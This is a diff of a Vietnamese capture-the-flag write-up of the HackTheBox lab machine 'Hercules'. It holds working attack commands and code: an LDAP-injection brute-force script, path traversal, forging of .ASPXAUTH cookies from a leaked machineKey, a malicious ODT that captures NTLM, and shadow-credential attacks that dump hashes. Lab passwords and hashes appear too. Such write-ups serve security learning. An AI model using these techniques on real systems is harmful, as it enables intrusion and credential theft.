@@ -15,7 +15,7 @@ author: bumbi.203_
 ---
 
 ```bash
-**# Nmap 7.94SVN scan initiated Wed Nov  5 16:36:53 2025 as: nmap -sC -sV -Pn -T4 -stats-every=5s -oN Hercules 10.10.11.91
+# Nmap 7.94SVN scan initiated Wed Nov  5 16:36:53 2025 as: nmap -sC -sV -Pn -T4 -stats-every=5s -oN Hercules 10.10.11.91
 Nmap scan report for 10.10.11.91
 Host is up (0.31s latency).
 Not shown: 987 filtered tcp ports (no-response)
@@ -74,7 +74,7 @@ Host script results:
 |_  start_date: N/A
 
 Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
-# Nmap done at Wed Nov  5 16:39:55 2025 -- 1 IP address (1 host up) scanned in 182.53 seconds**
+# Nmap done at Wed Nov  5 16:39:55 2025 -- 1 IP address (1 host up) scanned in 182.53 seconds
 
 ```
 
@@ -146,7 +146,7 @@ Thì mình thấy thì bị giới hạn login sai. Chỉ còn cách là mình t
 ---
 
 ```bash
-**└─$ kerbrute userenum -d hercules.htb --dc 10.10.11.91 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+└─$ kerbrute userenum -d hercules.htb --dc 10.10.11.91 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 
     __             __               __
    / /_____  _____/ /_  _______  __/ /____
@@ -181,7 +181,7 @@ Như vậy thì mình có thể tự tạo ra 1 danh sách kết hợp với **`
         if not name:
             continue
         for c in "abcdefghijklmnopqrstuvwxyz":
-            print(f"{name}.{c}@hercules.htb")**
+            print(f"{name}.{c}@hercules.htb")
 
 ```
 
@@ -190,7 +190,7 @@ Khi chạy thì cần tạo ra 1 danh sách **`python3 generate.py > fuzz_names.
 Sau đó, mình chạy lại tool **`kerbrute`**
 
 ```bash
-**└─$ kerbrute userenum -d hercules.htb --dc 10.10.11.91 fuzz_names.txt
+└─$ kerbrute userenum -d hercules.htb --dc 10.10.11.91 fuzz_names.txt
 
     __             __               __
    / /_____  _____/ /_  _______  __/ /____
@@ -243,7 +243,7 @@ Version: dev (n/a) - 10/19/25 - Ronnie Flathers @ropnop
 Từ đây mình thu được 1 list các danh sách username như sau:
 
 ```bash
-**└─$ cat hercules_users.txt
+└─$ cat hercules_users.txt
 auditor
 administrator
 admin
@@ -280,8 +280,7 @@ tish.c
 vincent.g
 will.s
 winda.s
-zeke.s**
-
+zeke.s
 ```
 
 ### LDAP Injection
@@ -312,15 +311,14 @@ Trong machine **ghost**, tác giả đã thực hiện **ldap-injection-password
 Phát hiện ra 1 thẻ **input**:
 
 ```html
-**<input class="form-control" data-val="true" data-val-regex="Invalid Username" data-val-regex-pattern="^[^!&quot;#&amp;&#39;()*+,\\:;&lt;=>?[\\]^`{|}~]+$" data-val-required="The Username field is required." id="Username" name="Username" type="text" value="" />**
+<input class="form-control" data-val="true" data-val-regex="Invalid Username" data-val-regex-pattern="^[^!&quot;#&amp;&#39;()*+,\\:;&lt;=>?[\\]^`{|}~]+$" data-val-required="The Username field is required." id="Username" name="Username" type="text" value="" />
 
 ```
 
 Được kèm theo 1 token là:
 
 ```
-**__RequestVerificationToken=fZFHRi40bELcGHanbUkeemm--EIOeve6cCFlATOh7CNCY4LnnZZs_B1rrgCy427eL5z88H7i6WH-Igocf9kA8H-gn51DWmR9WY1CwmYeDWM1**
-
+__RequestVerificationToken=fZFHRi40bELcGHanbUkeemm--EIOeve6cCFlATOh7CNCY4LnnZZs_B1rrgCy427eL5z88H7i6WH-Igocf9kA8H-gn51DWmR9WY1CwmYeDWM1
 ```
 
 Từ đây thì mình đoán được query là **`(&(username=*))`** thì đây nó sẽ trả về kết quả hợp lệ.
@@ -346,7 +344,7 @@ Mình thử payload **`a*`** trước.
 Từ đây mình xác định là nó ko bắt đầu từ **`a*`** thì mình viết script tự động làm việc này với 1 danh sách username đã tìm ra.
 
 ```python
-**import requests
+import requests
 import string
 import urllib3
 import re
@@ -558,14 +556,12 @@ def main():
         print("\\nNo password found")
 
 if __name__ == "__main__":
-    main()**
-
+    main()
 ```
 
 Kết quả thu được:
 
 ```bash
-**┌──(kali㉿kali)-[~/Desktop]
 └─$ python3 script.py -u hercules_user.txt -t <https://hercules.htb>
 ============================================================
 Hercules LDAP Description/Password Enumeration
@@ -713,8 +709,7 @@ Testing 37 users
 ============================================================
 ENUMERATION COMPLETE
 ============================================================
-Traceback (most recent call last):**
-
+Traceback (most recent call last):
 ```
 
 Mình đã có 1 trường **`description`** của **`johnathan.j`** ⇒ **`change*th1s_p@ssw()rd!!`**
@@ -728,7 +723,7 @@ Thì lại hiển thị valid với **`ken.w`**. Cho mình login lại vào bằ
 ![image](/assets/img/HTB/season9/Hercules/image15.png)
 
 ```bash
-**SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False) (NTLM:False)
 SMB         dc.hercules.htb 445    dc               [+] hercules.htb\\ken.w:change*th1s_p@ssw()rd!!
 SMB         dc.hercules.htb 445    dc               -Username-                    -Last PW Set-       -BadPW- -Description-
 SMB         dc.hercules.htb 445    dc               Administrator                 2025-10-17 10:49:44 1       Built-in account for administering the computer/domain
@@ -773,7 +768,7 @@ SMB         dc.hercules.htb 445    dc               fiona.c                     
 SMB         dc.hercules.htb 445    dc               patrick.s                     2024-12-04 01:44:49 1
 SMB         dc.hercules.htb 445    dc               tanya.r                       2024-12-04 01:44:49 1
 SMB         dc.hercules.htb 445    dc               Admin                         2025-10-17 12:26:46 1
-SMB         dc.hercules.htb 445    dc               [*] Enumerated 42 local users: HERCULES**
+SMB         dc.hercules.htb 445    dc               [*] Enumerated 42 local users: HERCULES
 
 ```
 
@@ -859,7 +854,7 @@ Mình khi truyền 4 **`..\`** thì ko được nên sẽ bắt đầu rút ng�
 Như vậy mình hoàn toàn đọc được file **`web.config`** 
 
 ```xml
-**<?xml version="1.0" encoding="utf-8"?>
+<?xml version="1.0" encoding="utf-8"?>
 <!--
   For more information on how to configure your ASP.NET application, please visit
   https://go.microsoft.com/fwlink/?LinkId=301880
@@ -952,13 +947,13 @@ Như vậy mình hoàn toàn đọc được file **`web.config`**
     </compilers>
   </system.codedom>
 </configuration>
-<!--ProjectGuid: 6648C4C4-2FF2-4FF1-9F3E-1A560E46AA52-->**
+<!--ProjectGuid: 6648C4C4-2FF2-4FF1-9F3E-1A560E46AA52-->
 ```
 
 Quan sát lại request thì xuất hiện 1 cookie lạ 
 
 ```
-**.ASPXAUTH=4FC3B8AD788B38BC536345266F5B5D411622B7F250F3619A59541E0716FC0F363F4001BC851426274FFB02CA6D9411A00792FAD6E57250A75DE470FC82042E216670598FFE9951118F596BB95CF68496E9F186B74CE48FCA2EA4D89AFC6A491755A6E143DC00995AA9EDFA54564F4384D70DF6FBDB6325C822336A81529F095E9B7D712850856A67647063C3A98B78928DF0145FF30A9FBFD98023401C479E97S**
+.ASPXAUTH=4FC3B8AD788B38BC536345266F5B5D411622B7F250F3619A59541E0716FC0F363F4001BC851426274FFB02CA6D9411A00792FAD6E57250A75DE470FC82042E216670598FFE9951118F596BB95CF68496E9F186B74CE48FCA2EA4D89AFC6A491755A6E143DC00995AA9EDFA54564F4384D70DF6FBDB6325C822336A81529F095E9B7D712850856A67647063C3A98B78928DF0145FF30A9FBFD98023401C479E97S
 ```
 
 Sau khi search và hỏi AI về cookie **`.ASPXAUTH`** thì trường này dùng để xác định user nếu user đã tương tác với trang login (đã authenticate)
@@ -970,14 +965,14 @@ Sau khi search và hỏi AI về cookie **`.ASPXAUTH`** thì trường này dùn
 Một số thông tin của **`web.config`** thì xác định được **ASP .NET MVC 5 web application** 
 
 ```markdown
- **<assemblyIdentity name="System.Web.Mvc" publicKeyToken="31bf3856ad364e35" />
-	  <bindingRedirect oldVersion="1.0.0.0-5.3.0.0" newVersion="5.3.0.0" />**
+ <assemblyIdentity name="System.Web.Mvc" publicKeyToken="31bf3856ad364e35" />
+	  <bindingRedirect oldVersion="1.0.0.0-5.3.0.0" newVersion="5.3.0.0" />
 ```
 
 Và nó dùng .**NET Framework 4.8,** với form-based authentication và HTTPS redirection. 
 
 ```xml
-**<machineKey decryption="AES" decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581" validation="HMACSHA256" validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />**
+<machineKey decryption="AES" decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581" validation="HMACSHA256" validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />
 ```
 
 Theo tác giả **`0xdf`** , thì có nói về [https://0xdf.gitlab.io/2022/10/15/htb-perspective.html#webconfig-analysis](https://0xdf.gitlab.io/2022/10/15/htb-perspective.html#webconfig-analysis) của machine [https://0xdf.gitlab.io/2022/10/15/htb-perspective.html](https://0xdf.gitlab.io/2022/10/15/htb-perspective.html) 
@@ -1017,7 +1012,7 @@ Sau đó, mình cần restore nó lại.
 Và cần chỉnh sửa lại file **`Program.cs`** , này để có thể phù hợp cho việc decrypt.
 
 ```vbnet
-**using System;
+using System;
 using System.Security.Claims;
 using System.Threading.Tasks;
 using AspNetCore.LegacyAuthCookieCompat;
@@ -1044,7 +1039,7 @@ class Program
       Console.WriteLine(decryptedTicket.CookiePath);
       Console.ReadLine();
     }
-}**
+}
 
 ```
 
@@ -1055,7 +1050,7 @@ Sau đó,  mình chạy tool → nó decrypt được như sau:
 Và nếu hoàn toàn decrypt được thì cũng hoàn toàn có thể encrypt được → mình sẽ cần encrypt để leo lên user **`web_admin` →** chỉnh sửa lại file **`Program.cs`** 
 
 ```vbnet
-**using System;
+using System;
 using System.Security.Claims;
 using System.Threading.Tasks;
 using AspNetCore.LegacyAuthCookieCompat;
@@ -1080,7 +1075,7 @@ class Program
 
       Console.WriteLine(encryptedText);
     }
-}**
+}
 ```
 
 Nó sinh ra được 1 cookie như sau: 
@@ -1145,7 +1140,7 @@ Như vậy nếu mình đoán được **`/Forms`**  đặt tên như thế nào
 Dựa vào tên chức năng thì mình mạnh dạng đoán tên file **`Forms.cshtml`** :)))) 
 
 ```vbnet
-**@model HadesWeb.Models.UploadFormModel
+@model HadesWeb.Models.UploadFormModel
 @{
     ViewBag.Title = "Forms";
     Layout = "_Layout.cshtml";
@@ -1213,13 +1208,13 @@ Dựa vào tên chức năng thì mình mạnh dạng đoán tên file **`Forms.
     </div>
 }
 
-<script src="~/Content/js/modal.js"></script>**
+<script src="~/Content/js/modal.js"></script>
 ```
 
 Dựa vào file này thì mình đưa cho AI hỏi xem để xem có xác định được cấu trúc project ko 
 
 ```vbnet
-**HadesWeb/
+HadesWeb/
 │
 ├── App_Start/
 │   ├── RouteConfig.cs
@@ -1270,8 +1265,7 @@ Dựa vào file này thì mình đưa cho AI hỏi xem để xem có xác địn
 │
 ├── packages.config (nếu project dùng NuGet kiểu truyền thống)
 │
-└── Web.config (file cấu hình chính)**
-
+└── Web.config (file cấu hình chính)
 ```
 
 Từ đây mình có: 
@@ -1301,7 +1295,6 @@ Nó định nghĩa rằng **“Contains compiled assembiles (.dll files)”** ng
 ⇒ Từ đây mình cần decompile lại rồi sau đó đọc qua Path Traversal. 
 
 ```bash
-**┌──(kali㉿kali)-[~/Desktop]
 └─$ COOKIE="__RequestVerificationToken=LV4ZceLBdgdm5w74Q08KNwdhmeEX2zzhyrWVFVkJxF5w3ct2z54SO4khSI9H95tugd8QLz67u0ruJAk5x7G1wVY2FR-1-VJL_U_Ijqbl9as1"
                                                                                             
 ┌──(kali㉿kali)-[~/Desktop]
@@ -1310,7 +1303,7 @@ Nó định nghĩa rằng **“Contains compiled assembiles (.dll files)”** ng
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ curl -sk -H "COOKIE: $COOKIE" \ 
 > "${TARGET}?fileName=../../bin/HadesWeb.dll" \
-> -o HadesWeb.dll**
+> -o HadesWeb.dll
 ```
 
 Từ đây mình cần decomplie lại bằng tool này: 
@@ -1320,7 +1313,6 @@ Từ đây mình cần decomplie lại bằng tool này:
 Sau khi clone về thì mình chạy như sau: 
 
 ```bash
-**┌──(kali㉿kali)-[~/Desktop/tool_window/ASPNET/decomplieDotNet]
 └─$ wine dnSpy.exe HadesWeb.dll**
 ```
 
@@ -1333,21 +1325,16 @@ Cho nên mình chuyển sang tool này:
 - https://github.com/icsharpcode/AvaloniaILSpy
 
 ```bash
-**┌──(kali㉿kali)-[~/Desktop/tool_window/ASPNET/decomplieDotNet]
 └─$ cd ilSpy
 
-┌──(kali㉿kali)-[~/…/tool_window/ASPNET/decomplieDotNet/ilSpy]
 └─$ wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip
 
-┌──(kali㉿kali)-[~/…/tool_window/ASPNET/decomplieDotNet/ilSpy]
 └─$ unzip Linux.x64.Release.zip 
 Archive:  Linux.x64.Release.zip
   inflating: ILSpy-linux-x64-Release.zip  
                                                                                                                       
-┌──(kali㉿kali)-[~/…/tool_window/ASPNET/decomplieDotNet/ilSpy]
 └─$ unzip ILSpy-linux-x64-Release.zip
 
-┌──(kali㉿kali)-[~/…/decomplieDotNet/ilSpy/artifacts/linux-x64]
 └─$ ./ILSpy ~/Desktop/HadesWeb.dll**
 ```
 
@@ -1372,7 +1359,6 @@ Sau khi tìm kiếm về **`.odt cve`** thì có một vài cách tạo file đ�
 ⇒ Mình tìm ra 1 script được viết sẵn như sau [**Bad-ODF**](https://github.com/lof1sec/Bad-ODF). 
 
 ```bash
-**┌──(badodf-env)─(kali㉿kali)-[~/Desktop/Malicious_ODF_File_Creator]
 └─$ pip install ezodf && pip install --upgrade lxml
 
                                                                                                                           
@@ -1401,7 +1387,6 @@ Như vậy là mình đã tạo ra 1 file **`bad.odt`** có chứa ip của atta
 → Dùng **`responder`** để bắt lấy **`NTLM`** 
 
 ```bash
-**┌──(kali㉿kali)-[~/Desktop]
 └─$ sudo responder -I tun0 -v
 [sudo] password for kali: 
                                          __
@@ -1473,7 +1458,7 @@ Như vậy là mình đã tạo ra 1 file **`bad.odt`** có chứa ip của atta
     Responder Domain Name      [FTEP.LOCAL]
     Responder DCE-RPC Port     [45094]
 
-[+] Listening for events...**              
+[+] Listening for events...            
 ```
 
 Giờ thì mình tiến hành upload cái file độc hại lên. 
@@ -1577,27 +1562,24 @@ Cho nên mình trỏ tới rồi right click với thuộc tính.
 Mình thử bắt đầu request 1 TGT kerberos cho **`nataile.a`** 
 
 ```bash
-**┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
 └─$ sudo python3 getTGT.py -dc-ip 10.10.11.91 -k hercules.htb/natalie.a:'Prettyprincess123!'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
-[*] Saving ticket in natalie.a.ccache**
+[*] Saving ticket in natalie.a.ccache
 ```
 
 Giờ thì mình set 1 ticket mới. 
 
 ```bash
-**┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
 └─$ export KRB5CCNAME=natalie.a.ccache
                                                                                                                           
-┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
 └─$ klist 
 Ticket cache: FILE:natalie.a.ccache
 Default principal: natalie.a@HERCULES.HTB
 
 Valid starting       Expires              Service principal
 11/30/2025 08:03:20  11/30/2025 18:03:20  krbtgt/HERCULES.HTB@HERCULES.HTB
-        renew until 12/01/2025 08:03:15**
+        renew until 12/01/2025 08:03:15
 ```
 
 Sau đó mình dùng tool [**Certipy**](https://github.com/ly4k/Certipy) để thực hiện shadow-credentials attack để có được hash của **`bob.w`** 
@@ -1605,7 +1587,6 @@ Sau đó mình dùng tool [**Certipy**](https://github.com/ly4k/Certipy) để t
 - https://github.com/ly4k/Certipy
 
 ```bash
-**┌──(certipy-env)─(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
 └─$ certipy-ad shadow auto -u natalie.a@hercules.htb -k -dc-host dc.hercules.htb -account bob.w
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
@@ -1633,17 +1614,16 @@ BQQADAABAAj/////AAAAAAAAAAEAAAABAAAADEhFUkNVTEVTLkhUQgAAAAVib2IudwAAAAEAAAABAAAA
 [*] Trying to retrieve NT hash for 'bob.w'
 [*] Restoring the old Key Credentials for 'bob.w'
 [*] Successfully restored the old Key Credentials for 'bob.w'
-[*] NT hash for 'bob.w': 8a65c74e8f0073babbfac6725c66cc3f**
+[*] NT hash for 'bob.w': 8a65c74e8f0073babbfac6725c66cc3f
 ```
 
 Sau đó mình đã hash của **`bob.w`** , giờ thì mình request cho TGT. 
 
 ```bash
-**┌──(certipy-env)─(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
 └─$ sudo python3 getTGT.py -dc-ip 10.10.11.91 -hashes :8a65c74e8f0073babbfac6725c66cc3f -k hercules.htb/bob.w
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
-[*] Saving ticket in bob.w.ccache**
+[*] Saving ticket in bob.w.ccache
 ```
 
 Mình dùng tool bloodyAD để bắt đầu Active Directory Enum trong **`bob.w`** 
@@ -1656,7 +1636,6 @@ Mình dùng tool bloodyAD để bắt đầu Active Directory Enum trong **`bob.
 Mình sẽ thử check **`writeable`** trên **`bob.w`** 
 
 ```bash
-**┌──(env)─(kali㉿kali)-[~/Desktop/bloodyAD/bloodyAD]
 └─$ klist
 Ticket cache: FILE:/home/kali/Desktop/bob.w.ccache
 Default principal: bob.w@HERCULES.HTB
@@ -2053,13 +2032,13 @@ cn: WRITE
 
 distinguishedName: CN=Ray Nelson,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
 name: WRITE
-cn: WRITE**
+cn: WRITE
 ```
 
 Mình có **`CREATE_CHILD`** trên target **`OU`** 
 
 ```bash
-**distinguishedName: OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
+distinguishedName: OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
 device: CREATE_CHILD
 ipNetwork: CREATE_CHILD
 organizationalUnit: CREATE_CHILD
@@ -2131,13 +2110,13 @@ applicationEntity: CREATE_CHILD
 dSA: CREATE_CHILD
 ipsecISAKMPPolicy: CREATE_CHILD
 name: WRITE
-cn: WRITE**
+cn: WRITE
 ```
 
 Và mình cũng có quyền **`WRITE`** trên **`stephen.m`** , **`auditor`** và thậm chí trên chính user đó. 
 
 ```bash
-**distinguishedName: CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
+distinguishedName: CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
 name: WRITE
 cn: WRITE
 
@@ -2145,11 +2124,11 @@ cn: WRITE
 
 distinguishedName: CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
 name: WRITE
-cn: WRITE**
+cn: WRITE
 ```
 
 ```bash
-**distinguishedName: CN=Bob Wood,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
+distinguishedName: CN=Bob Wood,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
 thumbnailPhoto: WRITE
 pager: WRITE
 mobile: WRITE
@@ -2228,7 +2207,7 @@ street: WRITE
 st: WRITE
 l: WRITE
 c: WRITE
-cn: WRITE**
+cn: WRITE
 ```
 
 Giờ thì mình di chuyển tới **`stephen.m`** tới **`Web Department`** OU vì nó có nhiều ACLs dễ hơn.
@@ -2242,20 +2221,20 @@ Giờ thì mình di chuyển tới **`stephen.m`** tới **`Web Department`** OU
 Mình sẽ dùng **`Set-DomainObjectDN`** để chỉnh sửa object của thuộc tính distinguishedName để thay đổi OU. 
 
 ```bash
-**╭─LDAPS─[dc.hercules.htb]─[HERCULES\bob.w]-[NS:<auto>]
+╭─LDAPS─[dc.hercules.htb]─[HERCULES\bob.w]-[NS:<auto>]
 PV > Set-DomainObjectDN -Identity stephen.m -DestinationDN 'OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb'      
 [2025-11-30 11:05:50] [Get-DomainObject] Using search base: DC=hercules,DC=htb
 [2025-11-30 11:05:50] [Get-DomainObject] LDAP search filter: (&(1.2.840.113556.1.4.2=*)(|(samAccountName=stephen.m)(name=stephen.m)(displayName=stephen.m)(objectSid=stephen.m)(distinguishedName=stephen.m)(dnsHostName=stephen.m)(objectGUID=*stephen.m*)))
 [2025-11-30 11:05:51] [Get-DomainObject] Using search base: DC=hercules,DC=htb
 [2025-11-30 11:05:51] [Get-DomainObject] LDAP search filter: (&(1.2.840.113556.1.4.2=*)(distinguishedName=OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb))
 [2025-11-30 11:05:51] [Set-DomainObjectDN] Modifying CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb object dn to OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
-[2025-11-30 11:05:51] [Set-DomainObject] Success! modified new dn for CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb**
+[2025-11-30 11:05:51] [Set-DomainObject] Success! modified new dn for CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
 ```
 
 Nhìn thấy nó báo **`Success`** → nghĩa là mình chuyển OU **`Orgnizational Unit`** của **`stephen.m`** từ OU **`Security Department`** sang OU **`Web Department`** giờ thì mình thử thực hiện lấy hash của **`stephen.m`** 
 
 ```bash
-**┌──(certipy-env)─(kali㉿kali)-[~/Desktop/shadow_credentials]
+┌──(certipy-env)─(kali㉿kali)-[~/Desktop/shadow_credentials]
 └─$ export KRB5CCNAME=~/Desktop/natalie.a.ccache                                                                      
                                                                                                                             
 ┌──(certipy-env)─(kali㉿kali)-[~/Desktop/shadow_credentials]
@@ -2290,18 +2269,18 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'stephen.m'
 [*] Restoring the old Key Credentials for 'stephen.m'
 [*] Successfully restored the old Key Credentials for 'stephen.m'
-[*] NT hash for 'stephen.m': 9aaaedcb19e612216a2dac9badb3c210**
+[*] NT hash for 'stephen.m': 9aaaedcb19e612216a2dac9badb3c210
 ```
 
 Giờ thì request cho TGT. 
 
 ```bash
-**┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
+┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
 └─$ sudo python3 getTGT.py -dc-ip 10.10.11.91 -hashes :9aaaedcb19e612216a2dac9badb3c210 -k hercules.htb/stephen.m
 [sudo] password for kali: 
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
-[*] Saving ticket in stephen.m.ccache**
+[*] Saving ticket in stephen.m.ccache
 ```
 
 Giờ mình quay lại bloodhound và nhìn thấy. 
@@ -2331,8 +2310,8 @@ Giờ thì mình biết **`Auditor`** là thành viên của **`REMOTE MANAGEMEN
 - https://github.com/ozelis/winrmexec
 
 ```bash
-                                                                                                                                                                                             
-**┌──(kali㉿kali)-[~/Desktop/remote_tool/winrmexec]
+           
+┌──(kali㉿kali)-[~/Desktop/remote_tool/winrmexec]
 └─$ export KRB5CCNAME=~/Desktop/Auditor.ccache 
                                                                                                                                                                                              
 ┌──(kali㉿kali)-[~/Desktop/remote_tool/winrmexec]
@@ -2383,11 +2362,11 @@ Special !bangs:
   !log                             # start logging output to winrmexec_[timestamp]_stdout.log
   !stoplog                         # stop logging output to winrmexec_[timestamp]_stdout.log
 
-PS C:\Users\auditor\Documents>**
+PS C:\Users\auditor\Documents>
 ```
 
 ```bash
-**PS C:\Users\auditor\Documents> cd ..\Desktop
+PS C:\Users\auditor\Documents> cd ..\Desktop
 PS C:\Users\auditor\Desktop> dir
 
     Directory: C:\Users\auditor\Desktop
@@ -2398,7 +2377,7 @@ Mode                 LastWriteTime         Length Name
 
 PS C:\Users\auditor\Desktop> type user.txt
 ff8533e6acd7c892e4fb84e2ed2f7a27
-PS C:\Users\auditor\Desktop>**
+PS C:\Users\auditor\Desktop>
 
 ```
 
@@ -2415,7 +2394,7 @@ Sau khi mình đã có **`Auditor`** , mình thực hiện recon thông tin từ
 ---
 
 ```bash
-**PS C:\Users\auditor\Desktop> cd C:\Shares
+PS C:\Users\auditor\Desktop> cd C:\Shares
 PS C:\Shares> dir
 
     Directory: C:\Shares
@@ -2438,7 +2417,7 @@ d-----         12/4/2024  11:45 AM                Recruitment
 d-----         12/4/2024  11:45 AM                Security Department                                                   
 d-----         12/4/2024  11:45 AM                Web Department                                                        
 
-PS C:\Shares\Department>**
+PS C:\Shares\Department>
 
 ```
 
@@ -2447,7 +2426,7 @@ Mình đã tim thấy 1 vài folder tại **`C:\Shares\Department`**
 Mình sẽ thử kiểm tra và show ra thông tin nào quan trọng. 
 
 ```bash
-**PS C:\Shares\Department\IT> dir
+PS C:\Shares\Department\IT> dir
 
     Directory: C:\Shares\Department\IT
 
@@ -2456,7 +2435,7 @@ Mode                 LastWriteTime         Length Name
 -a----         12/4/2024  11:45 AM           1048 cleanup.lnk                                                           
 -a----         12/4/2024  11:15 AM            935 notice.eml                                                            
 
-PS C:\Shares\Department\IT>**
+PS C:\Shares\Department\IT>
 ```
 
 Sau khi check 1 hồi thì có **`IT`** với **`cleanup.lnk`** → 1 Shortcut của Windows. 
@@ -2466,7 +2445,7 @@ Và file **`notice.eml`** là format cho việc save electronic mail message bao
 → Nên mình kiểm tra. 
 
 ```bash
-**PS C:\Shares\Department\IT> type notice.eml
+PS C:\Shares\Department\IT> type notice.eml
 --_004_MEYP282MB3102AC3B2MEYP282MB3102AUSP_
 Content-Type: multipart/alternative;
         boundary="_000_MEYP282MB3102AC3E29FED8B2MEYP282MB3102AUSP_"
@@ -2497,13 +2476,13 @@ Regards, Ashley.
 
 --_000_MEYP282MB3102AC3E21A33MEYP282MB3102AUSP_
 Content-Type: text/html; charset="us-ascii"
-Content-Transfer-Encoding: quoted-printable**
+Content-Transfer-Encoding: quoted-printable
 ```
 
 Mình đã có mail gủi từ **`Ashley.b`** tới **`IT Support`** nói về việc thay đổi password và vấn đề quyền cũng như đề cập tới chạy file shortcut trong share. 
 
 ```bash
-**PS C:\Shares\Department\IT> type cleanup.lnk
+PS C:\Shares\Department\IT> type cleanup.lnk
 LÀF‹ ƒj&îEÛ_Òl&îEÛ_Òl&îEÛf½PàOÐ ê:i¢+00/C:\x1„Y™
 Usersd  ï¾¨RÚ@„Y™
 . :¿§ÎUsers@shell32.dll,-21813Z1„Y§
@@ -2518,7 +2497,7 @@ Desktop@        ï¾„Y˜
 .ÏX     ¡ÊaCleanup.ps1U-TU½´^C:\Users\ashley.b\Desktop\aCleanup.ps1,..\..\..\Users\ashley.b\Desktop\aCleanup.ps1 ÿÿÿÿ¥
                                                                                                                        rÒb
 Å°K£‚i}Ír›€¥` XdcÁ›à±ï¤'ˆGÍÁ›à±ï¤'ˆGÍÎ   ‰1SPSâŠXF¼L8C»ü“&˜mÎm-S-1-5-21-1889966460-2597381952-958560702-50091SPS±mD­pH§H@.¤=xŒhH>.ôäP
-PS C:\Shares\Department\IT>**
+PS C:\Shares\Department\IT>
 
 ```
 
@@ -2533,7 +2512,7 @@ Mình lại tiếp tục check và import thông tin mình thu được vào Blo
 Và nhớ lại lúc đầu thì **`Auditor`** là member của 4 group bao gồm **`Forest Management`** 
 
 ```bash
-**PS C:\Shares\Department> whoami /groups
+PS C:\Shares\Department> whoami /groups
 
 GROUP INFORMATION
 -----------------
@@ -2551,7 +2530,7 @@ NT AUTHORITY\This Organization             Well-known group S-1-5-15            
 HERCULES\Domain Employees                  Group            S-1-5-21-1889966460-2597381952-958560702-1108 Mandatory group, Enabled by default, Enabled group
 HERCULES\Forest Management                 Group            S-1-5-21-1889966460-2597381952-958560702-1104 Mandatory group, Enabled by default, Enabled group
 Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
-Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192**                             
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                        
 ```
 
 Giờ thì mình check group này. 
@@ -2590,7 +2569,7 @@ Mình bị là nó trả ra quá nhiều thông tin → mình ko biết đươc 
 Sau khi cài xong, mình tới **`~/.config/bloodhound`** và kiểm tra file **`docker-compose.yml`** và mình chỉnh lại:
 
 ```bash
-**bloodhound:
+bloodhound:
     labels:
       name: bhce_bloodhound
     image: docker.io/specterops/bloodhound:${BLOODHOUND_TAG:-latest}** 
@@ -2602,11 +2581,11 @@ Mình thay đổi lại thành 7.4.1
 **bloodhound:
     labels:
       name: bhce_bloodhound
-    image: docker.io/specterops/bloodhound:7.4.1**
+    image: docker.io/specterops/bloodhound:7.4.1
 ```
 
 ```bash
-**┌──(kali㉿kali)-[~/…/RustHound-CE/RustHound-CE/target/release]
+┌──(kali㉿kali)-[~/…/RustHound-CE/RustHound-CE/target/release]
 └─$ ./rusthound-ce -d hercules.htb -u auditor -p 'Hoangphuc123@' -n 10.10.11.91 -c DCOnly
 ---------------------------------------------------
 Initializing RustHound-CE at 16:30:11 on 11/30/25
@@ -2659,7 +2638,7 @@ Powered by @g0h4n_0
 [2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
 [2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] .//20251130163023_hercules-htb_issuancepolicies.json created!
 
-RustHound-CE Enumeration Completed at 16:30:23 on 11/30/25! Happy Graphing!**
